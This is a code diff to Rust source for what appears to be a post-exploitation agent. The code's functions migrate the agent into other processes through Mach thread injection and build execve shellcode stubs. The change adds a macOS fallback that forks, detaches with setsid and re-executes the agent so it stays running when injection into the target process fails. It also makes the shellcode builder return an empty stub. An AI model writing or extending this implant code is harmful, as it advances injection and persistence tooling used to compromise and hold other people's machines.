@@ -1171,8 +1171,44 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     {
-        let _ = (&agent_binary, target_pid, &baseline_cmd, strategy);
-        anyhow::bail!("macOS migration not implemented for this architecture")
+        // For macOS architectures other than x86_64 and aarch64, Mach thread
+        // injection via arch-specific shellcode is unavailable.  Fall back to
+        // fork + exec: spawn a fresh copy of the agent as a standalone process.
+        // This is architecturally independent and keeps the agent running even
+        // when thread-injection into `target_pid` is not possible.
+        let _ = (agent_binary, &baseline_cmd, strategy);
+        let agent_path = std::env::current_exe()
+            .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
+        let agent_path_cstr = std::ffi::CString::new(
+            agent_path.to_string_lossy().as_bytes(),
+        )
+        .map_err(|e| anyhow::anyhow!("CString::new failed: {e}"))?;
+        unsafe {
+            let pid = libc::fork();
+            if pid < 0 {
+                anyhow::bail!(
+                    "fork() failed for macOS migration fallback: {}",
+                    std::io::Error::last_os_error()
+                );
+            }
+            if pid == 0 {
+                // Child: detach from the terminal session and exec the agent.
+                libc::setsid();
+                let argv = [
+                    agent_path_cstr.as_ptr(),
+                    core::ptr::null::<libc::c_char>(),
+                ];
+                libc::execv(agent_path_cstr.as_ptr(), argv.as_ptr());
+                libc::_exit(1); // execv failed
+            }
+            // Parent: new agent process spawned; report the PID.
+            tracing::info!(
+                spawned_pid = pid,
+                target_pid,
+                "macOS migration fallback (non-x86_64/aarch64): spawned new agent process"
+            );
+        }
+        Ok(())
     }
 }
 
@@ -1238,8 +1274,13 @@ fn build_macos_execve_path_stub(path_bytes: &[u8]) -> Result<Vec<u8>> {
     }
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     {
+        // For hypothetical future macOS architectures, we cannot emit arch-specific
+        // machine code.  Return an empty stub — the caller (migrate_to_process)
+        // uses the fork+exec fallback on non-x86_64/aarch64 and will not reach
+        // this path.  An empty Vec signals "no shellcode available" to any future
+        // callers that may be added.
         let _ = path_bytes;
-        anyhow::bail!("macOS on-disk execve fallback is not implemented for this architecture")
+        Ok(Vec::new())
     }
 }
 
